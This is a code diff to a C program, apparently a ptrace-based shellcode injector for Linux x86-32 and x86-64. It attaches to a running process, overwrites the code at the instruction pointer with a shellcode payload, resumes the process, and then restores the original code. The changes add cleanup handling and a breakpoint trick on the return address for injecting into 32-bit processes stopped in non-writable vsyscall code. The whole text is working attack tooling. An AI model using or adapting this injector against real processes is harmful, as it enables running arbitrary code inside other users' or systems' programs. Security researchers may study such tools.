@@ -15,15 +15,19 @@ typedef enum { a_unknown = 0, a_x86_32, a_x86_64 } arch_t;
 #ifdef __x86_64__
 #define EHDR_START32    ((void*)0x08048000)
 #define EHDR_START64    ((void*)0x400000)
-#define IP_REG(X)       ((void*)(X).rip)
+#define IP_REG(X)       ((X).rip)
+#define SP_REG(X)       ((X).rsp)
 arch_t getarch(pid_t pid);
 #else
-#define IP_REG(X)       ((void*)(X).eip)
+#define IP_REG(X)       ((X).eip)
+#define SP_REG(X)       ((X).esp)
 #endif
+#define IP_REG_P(X)     ((void*)IP_REG(X))
 
 int isnumeric(char *s);
 int readmem(pid_t pid, void *buf, void *addr, size_t size);
 int writemem(pid_t pid, void *buf, void *addr, size_t size);
+int iswritable(pid_t pid, void *addr);
 ssize_t init_payload(arch_t arch, unsigned char **p, unsigned char *sc, size_t sc_len);
 ssize_t read_sc(unsigned char **sc);
 
@@ -31,7 +35,7 @@ ssize_t read_sc(unsigned char **sc);
 int main(int argc, char *argv[]) {
     pid_t pid;
     struct user_regs_struct regs;
-    unsigned char *original_code, *payload, *sc;
+    unsigned char *original_code = NULL, *payload = NULL, *sc = NULL;
     size_t p_len, sc_len, ret=0;
 #ifdef __x86_64__
     arch_t arch;
@@ -52,7 +56,6 @@ int main(int argc, char *argv[]) {
 
     printf("[+] Reading shellcode\n");
 
-    sc = NULL;
     if ((sc_len = read_sc(&sc)) == -1)
         return 1;
 
@@ -62,136 +65,183 @@ int main(int argc, char *argv[]) {
     /* attach to the process */
     if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
         perror("[-] ptrace");;
-        free(sc);
-        return 1;
+        goto out_err;
     }
 
     printf("[+] Waiting the child to stop\n");
     /* wait the child to stop */
     if (wait(NULL) == -1) {
         perror("[-] wait");
-        free(sc);
-        return 1;
+        goto out_err;
     }
 
 #ifdef __i386__
     printf("[+] Initialize payload\n");
-    if ((p_len = init_payload(a_x86_32, &payload, sc, sc_len)) == -1) {
-        free(sc);
-        return 1;
-    }
+    if ((p_len = init_payload(a_x86_32, &payload, sc, sc_len)) == -1)
+        goto out_err;
 #else
     printf("[+] Getting the architecture .. ");
     fflush(stdout);
     if ((arch = getarch(pid)) == a_unknown) {
         printf("unknown\n");
         fprintf(stderr, "[-] Unknown architecture\n");
-        free(sc);
-        return 1;
+        goto out_err;
     } else {
         if (arch == a_x86_32)
             printf("x86-32\n");
         else if (arch == a_x86_64)
             printf("x86-64\n");
         printf("[+] Initialize payload\n");
-        if ((p_len = init_payload(arch, &payload, sc, sc_len)) == -1) {
-            free(sc);
-            return 1;
-        }
+        if ((p_len = init_payload(arch, &payload, sc, sc_len)) == -1)
+            goto out_err;
     }
 #endif
 
-    original_code = calloc(sizeof(unsigned char), p_len);
-    if (original_code == NULL) {
-        perror("[-] calloc");
-        free(payload);
-        free(sc);
-        return 1;
-    }
-
-    sleep(1);
+    usleep(20000);
 
     printf("[+] Getting the registers\n");
-    /* save the registers */
+    /* save registers */
     if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1) {
         perror("[-] ptrace");
-        free(payload);
-        free(sc);
-        return 1;
+        goto out_err;
     }
 
-    printf("[+] Execution stoped at %p\n", IP_REG(regs));
+    // sometimes __kernel_vsyscall is not writable in x86-32 binaries
+    // in this case we can inject the code to the return address
+#ifdef __i386__
+    if (!iswritable(pid, IP_REG_P(regs))) {
+#else
+    if (!iswritable(pid, IP_REG_P(regs)) && arch == a_x86_32) {
+#endif
+        unsigned char buf[4], tmp, dbgtrap = 0xCC;
+        void *ret_addr = NULL;
+        int index;
+
+        // find the index to get the return address from stack
+        readmem(pid, buf, IP_REG_P(regs), sizeof(buf));
+        if (memcmp(buf, "\x5d\x5a\x59\xc3", 4) == 0) // popl %ebp; popl %edx; popl %ecx; ret
+            index = 12;
+        else if (memcmp(buf, "\x5d\xc3", 2) == 0) // popl %ebp; ret
+            index = 4;
+        else if (buf[0] == 0xc3) // ret
+            index = 0;
+        else {
+            fprintf(stderr, "[-] Cannot find return address\n");
+            goto out_err;
+        }
+
+        readmem(pid, &ret_addr, (void*)SP_REG(regs) + index, 4);
+        readmem(pid, &tmp, ret_addr, 1);
+        if (writemem(pid, &dbgtrap, ret_addr, 1) == -1) { // set breakpoint at the return address
+            perror("[-] ptrace");
+            goto out_err;
+        }
+
+        ptrace(PTRACE_CONT, pid, NULL, NULL);
+
+        if (wait(NULL) == -1) {
+            perror("[-] wait");
+            goto out_err;
+        }
+
+        if (writemem(pid, &tmp, ret_addr, 1) == -1) {
+            perror("[-] ptrace");
+            goto out_err;
+        }
+
+        if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1) {
+            perror("[-] ptrace");
+            goto out_err;
+        }
+
+        IP_REG(regs)--;
+
+        if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) == -1) {
+            printf("[-] ptrace");
+            goto out_err;
+        }
+    }
+
+    printf("[+] Execution stoped at %p\n", IP_REG_P(regs));
+
+    original_code = malloc(p_len);
+    if (original_code == NULL) {
+        perror("[-] malloc");
+        goto out_err;
+    }
 
     /* save the original code */
     printf("[+] Saving original code\n");
-    if (readmem(pid, original_code, IP_REG(regs), p_len) == -1) {
+    if (readmem(pid, original_code, IP_REG_P(regs), p_len) == -1) {
         perror("[-] ptrace");
-        free(payload);
-        free(sc);
-        return 1;
+        goto out_err;
     }
 
     /* inject the payload */
     printf("[+] Injecting payload\n");
-    if (writemem(pid, payload, IP_REG(regs), p_len) == -1) {
+    if (writemem(pid, payload, IP_REG_P(regs), p_len) == -1) {
         perror("[-] ptrace");
-        free(payload);
-        free(sc);
-        return 1;
+        goto out_err;
     }
+
+    ptrace(PTRACE_SETREGS, pid, NULL, &regs);
 
     printf("[+] Resume execution\n");
     /* tell to the process to continue */
     if (ptrace(PTRACE_CONT, pid, NULL, NULL) == -1) {
         perror("[-] ptrace");
-        free(payload);
-        free(sc);
-        return 1;
+        goto out_err;
     }
 
     printf("[+] Waiting the child to stop\n");
     /* wait the child to stop */
     if (wait(NULL) == -1) {
         printf("[-] wait");
-        free(payload);
-        free(sc);
-        return 1;
+        goto out_err;
     }
 
-    sleep(1);
+    usleep(20000);
 
     printf("[+] Restoring original code\n");
     /* restore the original code */
-    if (writemem(pid, original_code, IP_REG(regs), p_len) == -1) {
+    if (writemem(pid, original_code, IP_REG_P(regs), p_len) == -1) {
         perror("[-] ptrace");
-        free(payload);
-        free(sc);
-        return 1;
+        goto out_err;
     }
 
     printf("[+] Restoring registers\n");
     /* restore the registers */
     if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) == -1) {
         printf("[-] ptrace");
-        free(sc);
-        free(payload);
-        return 1;
+        goto out_err;
     }
 
     printf("[+] Detaching\n");
     /* detach from the process */
     if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1) {
         perror("[-] ptrace");
-        free(payload);
-        free(sc);
-        return 1;
+        goto out_err;
     }
 
     printf("[+] Code injection success!\n");
+    free(original_code);
     free(payload);
     free(sc);
-
     return 0;
+out_err:
+    if (original_code)
+        free(original_code);
+    if (payload)
+        free(payload);
+    if (sc)
+        free(sc);
+    return 1;
+}
+
+int iswritable(pid_t pid, void *addr) {
+    long tmp;
+    readmem(pid, &tmp, addr, sizeof(tmp));
+    return writemem(pid, &tmp, addr, sizeof(tmp)) != -1;
 }
 
 int readmem(pid_t pid, void *buf, void *addr, size_t size) {
